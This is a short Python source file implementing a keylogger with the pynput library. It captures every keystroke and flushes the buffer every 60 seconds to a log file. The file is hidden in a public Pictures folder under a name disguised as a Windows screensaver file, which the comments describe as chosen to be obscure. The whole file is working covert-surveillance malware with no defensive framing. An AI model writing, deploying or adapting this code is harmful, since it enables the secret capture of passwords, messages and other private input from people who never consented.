from pynput.keyboard import Key, Listener
import logging
import threading

path = r"C:\Users\Public\Pictures\microsoft-windows-default-screensaver.txt"	#sets the file path for the log file to an obscure folder
buffer = ""
time_interval = 60 #information is recorded to the log every 60 seconds

logging.basicConfig(filename = path, level = logging.DEBUG, format="%(asctime)s: %(message)s")

#each key press is recorded to the buffer
def on_press(key):
	global buffer
	try:
		buffer += key.char
	except:
		if str(key) == "Key.space":
			buffer += " "
		else:
			buffer += str(key)

#the contents of the buffer is sent to the log file and cleared at the designated interval
def write_log():
	global buffer
	threading.Timer(time_interval, write_log).start()
	if buffer:
		logging.info("".join(buffer))
		buffer = ""

write_log()

#listens for key strokes
with Listener(on_press = on_press) as listener:
    listener.join()
